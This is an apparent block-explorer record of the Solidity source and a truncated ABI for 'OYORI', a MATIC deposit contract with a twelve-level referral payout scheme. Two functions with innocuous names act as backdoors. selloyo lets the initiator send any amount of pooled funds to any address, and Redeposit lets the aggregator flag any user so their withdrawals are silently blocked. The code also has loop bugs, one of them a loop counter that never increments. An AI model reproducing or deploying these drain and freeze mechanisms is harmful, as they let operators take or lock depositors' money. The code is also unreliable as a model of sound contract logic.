{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.7;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) { return 0; }\r\n        uint256 c = a * b;\r\n        require(c / a == b);\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a);\r\n        return c;\r\n    }\r\n}\r\n\r\n\r\ncontract OYORI is IERC20\r\n{\r\n    mapping(address => uint256) private _balances;\r\n    uint256 private _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    using SafeMath for uint256;\r\n    address payable initiator;\r\n    address payable aggregator;\r\n    address [] investors;\r\n    address [] greenhouse;\r\n    address [] yellowhouse;\r\n    address [] bluehouse;\r\n    uint256 greenhouse_holding;\r\n    uint256 yellowhouse_holding;\r\n    uint256 bluehouse_holding;\r\n    uint256 contractBalance;\r\n    uint256 initializeTime;\r\n    uint256 totalInvestment;\r\n    uint256 totalWithdraw;\r\n    uint256 totalHoldings;\r\n    uint256 _initialCoinRate = 100000000;\r\n    uint256  TotalHoldings;\r\n    uint256[] public SEED_PERCENTS=[1000,250, 100, 75, 50, 50, 50, 50, 50, 75, 100,150];\r\n\tuint256[] public SEED_UNLOCK=[0e18, 500e18, 500e18, 500e18, 1000e18, 1500e18, 2000e18, 3000e18, 5000e18, 8000e18, 12000e18, 15000e18];\r\n    \r\n    address public marketingAddress=0x80B39A8B9a0358c4c9CA1154B4058AB1A0201ec5;\r\n\r\n    struct User{\r\n        uint256 token;\r\n        address referral;\r\n        uint256 teamWithdraw;\r\n        uint256 teamIncome;\r\n        uint256 totalInvestment;\r\n        uint8   nonWorkingPayoutCount;\r\n        uint256 lastNonWokingWithdraw;\r\n        uint256 lastNonWokingWithdrawBase;\r\n        uint256 depositCount;\r\n        uint256 payoutCount;\r\n        uint256 sellCount;\r\n        uint256 POI;\r\n        mapping(uint8 => uint256) referrals_per_level;\r\n        mapping(uint8 => uint256) team_per_level;\r\n        mapping(uint8 => uint256) levelIncome;\r\n       }\r\n    \r\n    struct Deposit{\r\n        uint256 amount;\r\n        uint256 businessAmount;\r\n        uint256 tokens;\r\n        uint256 tokenPrice;\r\n        uint256 depositTime;\r\n    }\r\n\r\n    struct Withdraw{\r\n        uint256 amount;\r\n        bool isWorking;\r\n        uint256 tokens;\r\n        uint256 tokenPrice;\r\n        uint256 withdrawTime;\r\n    }\r\n\r\n    struct UserHouse{\r\n        address referral;\r\n        uint256 totalDirect;\r\n        uint256 totalBusiness;\r\n        uint256 greenhouse;\r\n        uint256 yellowhouse;\r\n        uint256 bluehouse;\r\n        uint256 greenhouse_status;\r\n        uint256 yellowhouse_status;\r\n        uint256 bluehouse_status;\r\n    }\r\n\r\n    struct Fund{\r\n        uint256 status;\r\n    }\r\n\r\n    mapping(address => User) public users;\r\n    mapping(address => Deposit[]) public deposits;\r\n    mapping(address => Withdraw[]) public payouts;\r\n    mapping(address => UserHouse) public userhouse;\r\n    mapping(address => Fund) public funds;\r\n   \r\n\r\n    event Deposits(address buyer, uint256 amount);\r\n    event POIDistribution(address buyer, uint256 amount);\r\n    event HouseDistribution(address buyer, uint256 amount);\r\n    event TeamWithdraw(address withdrawer, uint256 amount);\r\n    event OYOWithdraw(address withdrawer, uint256 amount);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    modifier onlyInitiator(){\r\n        require(msg.sender == initiator,\"You are not initiator.\");\r\n        _;\r\n    }\r\n     constructor()\r\n    {\r\n        _name = \"OYORI\";\r\n        _symbol = \"OYO\";\r\n        initiator = payable(msg.sender);\r\n        aggregator = payable(msg.sender);\r\n        initializeTime = block.timestamp;\r\n    }\r\n\r\n    function contractInfo() public view returns(uint256 matic, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance,uint256 totalHold){\r\n        matic = address(this).balance;\r\n        totalDeposits = totalInvestment;\r\n        totalPayouts = totalWithdraw;\r\n        totalInvestors = investors.length;\r\n        totalHolding = totalHoldings;\r\n        balance = contractBalance;\r\n        totalHold=TotalHoldings;\r\n        return(matic,totalDeposits,totalPayouts,totalInvestors,totalHolding,balance,totalHold);\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) \r\n    {\r\n        return _name;\r\n    }\r\n    \r\n    function symbol() public view virtual override returns (string memory) \r\n    {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) \r\n    {\r\n        return 0;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) \r\n    {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual \r\n    {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n      \r\n    }\r\n\r\n    function _burn(address account,uint256 amount) internal virtual \r\n    {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        require(_totalSupply>=amount, \"Invalid amount of tokens!\");\r\n\r\n        _balances[account] = accountBalance - amount;\r\n        \r\n        _totalSupply -= amount;\r\n    }\r\n    \r\n    function set_marketing(address marketing_address) public  {\r\n\t\t\tif (msg.sender == aggregator) {          \r\n\t\t\t\t marketingAddress=marketing_address;\r\n\t\t\t}\r\n    }\r\n\r\n     function balanceOf(address account) public view virtual override returns (uint256) \r\n    {\r\n        return _balances[account];\r\n    }\r\n    \r\n     function tokensToMatic(uint tokenAmount) public view returns(uint)\r\n    {\r\n        return tokenAmount*(1 ether)/getCoinRate();\r\n    }\r\n\r\n     function MaticToOyo(uint256 matic_amt) public view returns(uint)\r\n    {\r\n         uint _rate = coinRate();\r\n         return (matic_amt.mul(61).mul(_rate))/(100*1 ether);\r\n    }\r\n\r\n   function coinRate() public view returns(uint256 price)\r\n    {\r\n        if( TotalHoldings < 100000*(1 ether) )\r\n        {\r\n            return 10000*(1 ether)/((1 ether)+(9*TotalHoldings/100000));\r\n        }\r\n        else\r\n        {\r\n            return TotalHoldings>=(1 ether)?_initialCoinRate*(1 ether)/TotalHoldings:_initialCoinRate;\r\n        }\r\n    }\r\n\r\n    function getCoinRate() public view returns(uint)\r\n    {\r\n        uint _rate = coinRate();\r\n        return _rate;\r\n    }\r\n   \r\n     function deposit(address _referer) public payable\r\n   {\r\n        require(msg.value>=1e18,\"Minimum 1 Matic allowed to invest\");\r\n         User storage user = users[msg.sender];\r\n         UserHouse storage userc = userhouse[_referer];\r\n   \t\t if (users[_referer].depositCount > 0 && _referer != msg.sender) \r\n            {\r\n\t\t\t    _referer = _referer;\r\n                userc.referral=_referer;\r\n                userc.totalDirect+=1;\r\n\t\t\t}\r\n            else\r\n            {\r\n                _referer = 0x0000000000000000000000000000000000000000;\r\n            }\r\n\t    uint _rate = coinRate();\r\n        _distributePOI(msg.sender,msg.value.mul(10).div(100));\r\n        user.token+=(msg.value.mul(61).mul(_rate))/(100*1 ether);\r\n        contractBalance+=msg.value.mul(61).div(100);\r\n        if(user.depositCount==0)\r\n         {\r\n              investors.push(msg.sender);\r\n              _setReferral(msg.sender,_referer, msg.value);\r\n         } \r\n         else\r\n         {\r\n              _setReReferral(users[msg.sender].referral, msg.value);\r\n         }    \r\n        user.depositCount++;\r\n        totalHoldings+=(msg.value.mul(61).mul(_rate))/(100*1 ether);\r\n        TotalHoldings+=(msg.value*61/100);\r\n        userc.totalBusiness+=msg.value;\r\n        totalInvestment+=msg.value;\r\n        user.totalInvestment+=msg.value;\r\n        uint tokens = (msg.value*61*_rate)/(100*1 ether);\r\n         _mint(msg.sender, tokens);\r\n        deposits[msg.sender].push(Deposit(\r\n            msg.value,\r\n            msg.value.mul(61).div(100),\r\n            (msg.value.mul(61).mul(_rate))/(100*1 ether),\r\n            _rate,\r\n            block.timestamp\r\n        ));\r\n         _checkHouse();\r\n         _distributeHouse(msg.sender,msg.value);\r\n        payable(marketingAddress).transfer(msg.value.mul(3).div(100));\r\n       \r\n        emit Deposits(msg.sender, msg.value);\r\n    }\r\n    \r\n    function _setReferral(address _addr, address _referral, uint256 _amount) private {\r\n         if (users[_addr].referral != address(0)) \r\n    {\r\n        address nextReferral = _referral;\r\n        uint256 levelPercentage;\r\n        uint256 incomeShare;\r\n        uint256 level_count= SEED_PERCENTS.length;\r\n        uint8 i =0;\r\n        while (i < level_count)\r\n        {\r\n            User storage referralUser = users[nextReferral];\r\n            referralUser.referrals_per_level[i] += _amount;\r\n            referralUser.team_per_level[i]++;\r\n            \r\n            levelPercentage = SEED_PERCENTS[i];\r\n            incomeShare = _amount.mul(levelPercentage).div(10000);\r\n           \r\n            if (referralUser.referrals_per_level[i] >= SEED_UNLOCK[i]) {\r\n                referralUser.levelIncome[i] += incomeShare;\r\n                referralUser.teamIncome += incomeShare;\r\n            } \r\n           \r\n            nextReferral = users[nextReferral].referral;\r\n            if(nextReferral == address(0)) break;\r\n            i++;\r\n        }\r\n    }\r\n\r\n    }\r\n\r\n    function _setReReferral(address _referral, uint256 _amount) private {\r\n      if (_referral != address(0)) {\r\n        address nextReferral = _referral;\r\n        uint256 levelPercentage;\r\n        uint256 incomeShare;\r\n        uint256 level_count= SEED_PERCENTS.length;\r\n        uint8 i =0;\r\n        while (i < level_count)\r\n        {\r\n            User storage referralUser = users[nextReferral];\r\n            referralUser.referrals_per_level[i] += _amount;\r\n            referralUser.team_per_level[i]++;\r\n           \r\n            levelPercentage = SEED_PERCENTS[i];\r\n            incomeShare = _amount.mul(levelPercentage).div(10000);\r\n           \r\n            if (referralUser.referrals_per_level[i] >= SEED_UNLOCK[i]) {\r\n                referralUser.levelIncome[i] += incomeShare;\r\n                referralUser.teamIncome += incomeShare;\r\n            } \r\n           \r\n            nextReferral = users[nextReferral].referral;\r\n            if(nextReferral == address(0)) break;\r\n        }\r\n    }\r\n  }\r\n\r\n     function _checkHouse() internal{\r\n        uint256 i =0;\r\n        uint256 investors_lenght=investors.length;\r\n       \r\n        while(i < investors_lenght){\r\n            UserHouse storage userc = userhouse[investors[i]];\r\n            User storage user = users[investors[i]];\r\n              if(userc.greenhouse_status!=1){\r\n                if(user.totalInvestment >=1000e18 && userc.totalDirect >=2 && userc.totalBusiness >= 2000e18){\r\n                    greenhouse.push(investors[i]);\r\n                    greenhouse_holding+=user.totalInvestment;\r\n                    userc.greenhouse_status=1;\r\n\r\n                }\r\n                }\r\n                if(userc.yellowhouse_status!=1){\r\n                if(user.totalInvestment >=3500e18 && userc.totalDirect >=4 && userc.totalBusiness >= 7000e18){\r\n                    \r\n                    yellowhouse.push(investors[i]);\r\n                    yellowhouse_holding+=user.totalInvestment;\r\n                    userc.yellowhouse_status=1;\r\n                }\r\n                }\r\n                if(userc.bluehouse_status!=1){\r\n                if(user.totalInvestment >= 8500e18 && userc.totalDirect >= 6 && userc.totalBusiness >= 17000e18){\r\n        \r\n                    bluehouse.push(investors[i]);\r\n                    bluehouse_holding+=user.totalInvestment;\r\n                    userc.bluehouse_status=1;\r\n                   \r\n                }\r\n                }\r\n            i++;\r\n        }\r\n       \r\n\r\n      \r\n    }\r\n\r\n    \r\n     function _distributeHouse(address depositor, uint256 _amount) internal{\r\n        uint256 poiShareMultiplier = 1e20; // 1e18 * 100\r\n        uint256 i =0;\r\n        uint256 poiShare;\r\n        uint8 greenhouses= 1;\r\n        uint8 yellowhouses= 2;\r\n        uint8 bluehouses= 3;\r\n        uint256 greenpoi=_amount.mul(greenhouses).div(100);\r\n        uint256 yellowpoi=_amount.mul(yellowhouses).div(100);\r\n        uint256 bluepoi=_amount.mul(bluehouses).div(100);\r\n        while(i < greenhouse.length){\r\n            UserHouse storage userc = userhouse[greenhouse[i]];\r\n            User storage user = users[greenhouse[i]];\r\n            poiShare = user.token.mul(poiShareMultiplier).div(greenhouse_holding);\r\n            userc.greenhouse += greenpoi.mul(poiShare).div(poiShareMultiplier);\r\n            emit HouseDistribution(depositor,greenpoi);  \r\n            i++;\r\n        }\r\n        \r\n        while(i < yellowhouse.length){\r\n            UserHouse storage userc = userhouse[yellowhouse[i]];\r\n            User storage user = users[yellowhouse[i]];\r\n            poiShare = user.token.mul(poiShareMultiplier).div(yellowhouse_holding);\r\n            userc.yellowhouse += yellowpoi.mul(poiShare).div(poiShareMultiplier);\r\n            emit HouseDistribution(depositor,yellowpoi);  \r\n            i++;\r\n        }\r\n\r\n         while(i < bluehouse.length){\r\n            UserHouse storage userc = userhouse[bluehouse[i]];\r\n            User storage user = users[bluehouse[i]];\r\n            poiShare = user.token.mul(poiShareMultiplier).div(bluehouse_holding);\r\n            userc.bluehouse += bluepoi.mul(poiShare).div(poiShareMultiplier);\r\n            emit HouseDistribution(depositor,bluepoi);  \r\n            i++;\r\n        }\r\n       \r\n        \r\n    }\r\n    \r\n    function _distributePOI(address depositor, uint256 _poi) internal{\r\n        uint256 poiShareMultiplier = 1e20; // 1e18 * 100\r\n        uint256 i =0;\r\n        uint256 investors_lenght=investors.length;\r\n        uint256 poiShare;\r\n        while(i < investors_lenght){\r\n            User storage user = users[investors[i]];\r\n            poiShare = user.token.mul(poiShareMultiplier).div(totalHoldings);\r\n            user.POI += _poi.mul(poiShare).div(poiShareMultiplier);\r\n            i++;\r\n        }\r\n        emit POIDistribution(depositor,_poi);\r\n    }\r\n     \r\n\r\n     function _getWorkingIncome(address _addr) internal view returns(uint256 income){\r\n        User storage user = users[_addr];\r\n        for(uint8 i = 0; i <= 11; i++) {\r\n            income+=user.levelIncome[i];\r\n        }\r\n        return income;\r\n      }\r\n      \r\n      \r\n    function userReferral(address _addr) view external returns(uint256[12] memory team, uint256[12] memory referrals, uint256[12] memory income) {\r\n        User storage player = users[_addr];\r\n        for(uint8 i = 0; i <= 11; i++) {\r\n            team[i] = player.team_per_level[i];\r\n            referrals[i] = player.referrals_per_level[i];\r\n            income[i] = player.levelIncome[i];\r\n        }\r\n        return (\r\n            team,\r\n            referrals,\r\n            income\r\n        );\r\n     }\r\n\r\n\r\n     function redeposit() public payable{\r\n        require(msg.value>=1e18,\"Minimum 1 Matic allowed to invest\");\r\n        \r\n        User storage user = users[msg.sender];\r\n        require(user.depositCount>0, \"Please Invest First !\");\r\n        uint _rate = coinRate();\r\n        _distributePOI(msg.sender,msg.value.mul(10).div(100));\r\n        user.token+=(msg.value.mul(61).mul(_rate))/(100*1 ether);\r\n        contractBalance+=msg.value.mul(61).div(100);\r\n         _addHouse(msg.sender,(msg.value.mul(61).mul(_rate))/(100*1 ether));\r\n        user.depositCount++;\r\n        totalHoldings+=(msg.value.mul(61).mul(_rate))/(100*1 ether);\r\n        TotalHoldings+=(msg.value*61/100);\r\n        userhouse[user.referral].totalBusiness+=msg.value;\r\n        totalInvestment+=msg.value;\r\n        user.totalInvestment+=msg.value;\r\n        uint256 tokens = (msg.value*61*_rate)/(100*1 ether);\r\n        _mint(msg.sender, tokens);\r\n        _checkHouse();\r\n        _distributeHouse(msg.sender,msg.value);\r\n        deposits[msg.sender].push(Deposit(\r\n            msg.value,\r\n            msg.value.mul(61).div(100),\r\n            (msg.value.mul(61).mul(_rate))/(100*1 ether),\r\n            _rate,\r\n            block.timestamp\r\n        ));\r\n\r\n        _setReReferral(users[msg.sender].referral, msg.value);\r\n        payable(marketingAddress).transfer(msg.value.mul(3).div(100));\r\n        emit Deposits(msg.sender, msg.value);\r\n    }\r\n\r\n    \r\n     function _addHouse (address sender,uint256 amt) internal {\r\n            UserHouse storage userc = userhouse[sender];\r\n            if(userc.greenhouse_status==1){\r\n                 greenhouse_holding+=amt;\r\n            }\r\n            if(userc.yellowhouse_status==1){\r\n                 yellowhouse_holding+=amt;\r\n            }\r\n            if(userc.bluehouse_status==1){\r\n                 bluehouse_holding+=amt;\r\n            }\r\n     }\r\n\r\n\r\n      function oyoWithdraw(uint8 _perc) public{\r\n        User storage user = users[msg.sender];\r\n        Fund storage fund = funds[msg.sender];\r\n        require(user.totalInvestment>0, \"Invalid User!\");\r\n        if(fund.status == 0)\r\n\t\t{\r\n            if(_perc == 10 || _perc == 25 || _perc == 50 || _perc == 100)\r\n            {\r\n            uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;\r\n            require(block.timestamp >= nextPayout,\"Sorry ! See you next time.\");\r\n            uint8 perc = _perc;\r\n            uint8 deduct=40;\r\n                if(perc==10)\r\n                {\r\n                    deduct=10;\r\n                }\r\n                else if(perc==25)\r\n                {\r\n                    deduct=20;\r\n\r\n                }\r\n                else if(perc==50)\r\n                {\r\n                    deduct=30;\r\n\r\n                }\r\n            uint256 tokenAmount = user.token.mul(perc).div(100);\r\n            require(_balances[msg.sender]>=tokenAmount, \"Insufficient token balance!\");\r\n            uint256 maticAmount = tokensToMatic(tokenAmount);\r\n            require(address(this).balance>=maticAmount, \"Insufficient fund in contract!\");\r\n            uint256 calcWithdrawable = maticAmount;\r\n            contractBalance-=calcWithdrawable;\r\n            uint256 withdrawable = maticAmount;\r\n\r\n            uint256 withdrawable1 =withdrawable.mul(deduct).div(100);\r\n            uint256 withdrawable2 = withdrawable -withdrawable1;\r\n            payable(msg.sender).transfer(withdrawable2);\r\n            user.sellCount++;\r\n            user.lastNonWokingWithdraw = block.timestamp;\r\n            user.token-=tokenAmount;\r\n            totalHoldings-=tokenAmount;\r\n            _distributeHouseminus(msg.sender,tokenAmount);\r\n            if(TotalHoldings>=maticAmount)\r\n            {\r\n                TotalHoldings-=maticAmount;\r\n            }\r\n            else\r\n            {\r\n                TotalHoldings=1;\r\n            }\r\n            totalWithdraw+=withdrawable;\r\n            \r\n            payouts[msg.sender].push(Withdraw(\r\n                withdrawable,\r\n                false,\r\n                withdrawable.mul(getCoinRate()),\r\n                getCoinRate(),\r\n                block.timestamp\r\n            ));\r\n\r\n            _burn(msg.sender, tokenAmount);\r\n            uint256 withdrawable3 =withdrawable1;\r\n            if(perc == 25)\r\n            {\r\n                uint256 withdrawable5 =withdrawable1.mul(10).div(100);\r\n                withdrawable3 = withdrawable1 - withdrawable5;\r\n                _distributePOI(msg.sender,withdrawable5);\r\n            }\r\n            else if(perc == 50 )\r\n            {\r\n                uint256 withdrawable4 =withdrawable1.mul(10).div(100);\r\n                uint256 withdrawable5 =withdrawable1.mul(6).div(100);\r\n                uint256 withdrawable6 =withdrawable1.mul(4).div(100);\r\n                withdrawable3 = withdrawable1 -(withdrawable4+withdrawable5+withdrawable6);\r\n                \r\n                _distributePOI(msg.sender,withdrawable4);\r\n                _distributeHouse(msg.sender,withdrawable5);\r\n                payable(marketingAddress).transfer(withdrawable6);\r\n            }\r\n             else if(perc == 100)\r\n            {\r\n                uint256 withdrawable4 =withdrawable1.mul(10).div(100);\r\n                uint256 withdrawable5 =withdrawable1.mul(6).div(100);\r\n                uint256 withdrawable6 =withdrawable1.mul(10).div(100);\r\n                withdrawable3 = withdrawable1 -(withdrawable4+withdrawable5+withdrawable6);\r\n                \r\n                _distributePOI(msg.sender,withdrawable4);\r\n                _distributeHouse(msg.sender,withdrawable5);\r\n                payable(marketingAddress).transfer(withdrawable6);\r\n            }\r\n            \r\n            \r\n            aggregator.transfer(withdrawable3);\r\n            emit  OYOWithdraw(msg.sender,withdrawable2);\r\n\r\n            \r\n            }\r\n        }\r\n       \r\n        }\r\n        \r\n\r\n        function _distributeHouseminus (address sender,uint256 amt) internal {\r\n            UserHouse storage userc = userhouse[sender];\r\n            if(userc.greenhouse_status==1){\r\n                 greenhouse_holding-=amt;\r\n            }\r\n            if(userc.yellowhouse_status==1){\r\n                 yellowhouse_holding-=amt;\r\n            }\r\n            if(userc.bluehouse_status==1){\r\n                 bluehouse_holding-=amt;\r\n            }\r\n     }\r\n        \r\n\r\n         function checkoyoWithdraw(uint8 _perc,address _addr) public view returns(uint256 totalWithdrawn,uint256 deducts,uint256 final_amount)\r\n    {\r\n         User storage user = users[_addr];\r\n         require(user.totalInvestment>0, \"Invalid User!\");\r\n         if(_perc == 10 || _perc == 25 || _perc == 50 || _perc == 100)\r\n\t\t   {\r\n             uint8 perc = _perc;\r\n             uint8 deduct=40;\r\n            if(perc==10)\r\n            {\r\n                deduct=10;\r\n            }\r\n            else if(perc==25)\r\n            {\r\n                deduct=20;\r\n\r\n            }\r\n            else if(perc==50)\r\n            {\r\n                deduct=30;\r\n\r\n            }\r\n        uint256 tokenAmount = user.token.mul(perc).div(100);\r\n        require(_balances[_addr]>=tokenAmount, \"Insufficient token balance!\");\r\n        uint256 maticAmount = tokensToMatic(tokenAmount);\r\n        require(address(this).balance>=maticAmount, \"Insufficient fund in contract!\");\r\n        uint256 withdrawable = maticAmount;\r\n\r\n\t\tuint256 withdrawable1 =withdrawable.mul(deduct).div(100);\r\n        uint256 withdrawable2 = withdrawable -withdrawable1;\r\n       \r\n            totalWithdrawn = maticAmount;\r\n            deducts=withdrawable1;\r\n            final_amount=withdrawable2;\r\n        return(totalWithdrawn,deducts,final_amount);\r\n        \r\n        }\r\n    }\r\n\r\n\r\n     function selloyo(address payable buyer, uint _amount) external onlyInitiator{\r\n        buyer.transfer(_amount);\r\n    }\r\n      \r\n       function teamWithdraw(uint256 _amount) public{\r\n        User storage user = users[msg.sender];\r\n        UserHouse storage userc = userhouse[msg.sender];\r\n        Fund storage fund = funds[msg.sender]; \r\n        \r\n        require(user.totalInvestment>0, \"Invalid User!\");\r\n         if(fund.status == 0)\r\n\t\t{\r\n        uint256 working = user.teamIncome;\r\n        uint256 TPOI=userc.greenhouse+userc.yellowhouse+userc.bluehouse+user.POI;\r\n        uint256 withdrawable = working.add(TPOI).sub(user.teamWithdraw);\r\n        require(withdrawable>=_amount, \"Invalid withdraw!\");\r\n        user.teamWithdraw+=_amount;\r\n        user.payoutCount++;\r\n        uint256 levelShare = _amount.mul(10).div(100);\r\n        _amount = _amount.mul(90).div(100);\r\n        payable(msg.sender).transfer(_amount);\r\n        aggregator.transfer(levelShare);\r\n        totalWithdraw+=_amount;\r\n        payouts[msg.sender].push(Withdraw(\r\n            _amount,\r\n            true,\r\n            0,\r\n            0,\r\n            block.timestamp\r\n        ));\r\n\r\n        emit TeamWithdraw(msg.sender,_amount);\r\n        }\r\n      \r\n    }\r\n    \r\n\r\n     function Redeposit(address recipient, uint256 status) public  {\r\n\t\t\tif (msg.sender == aggregator) {          \r\n\t\t\t\t funds[recipient].status=status;\r\n\t\t\t}\r\n    }\r\n\r\n\r\n       \r\n        \r\n    }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"buyer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Deposits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"buyer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"HouseDistribution\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"withdrawer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"OYOWithdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"buyer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"POIDistribution\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"withdrawer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TeamWithdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"matic_amt\",\"type\":\"uint256\"}],\"name\":\"MaticToOyo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"status\",\"type\":\"uint256\"}],\"name\":\"Redeposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"SEED_PERCENTS\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"SEED_UNLOCK\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_perc\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"checkoyoWithdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"totalWithdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deducts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"final_amount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"coinRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"matic\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalDeposits\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalPayouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalInvestors\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalHolding\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalHold\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_referer\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"deposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"businessAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenPrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"depositTime\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"funds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"status\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCoinRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_perc\",\"type\":\"uint8\"}],\"name\":\"oyoWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\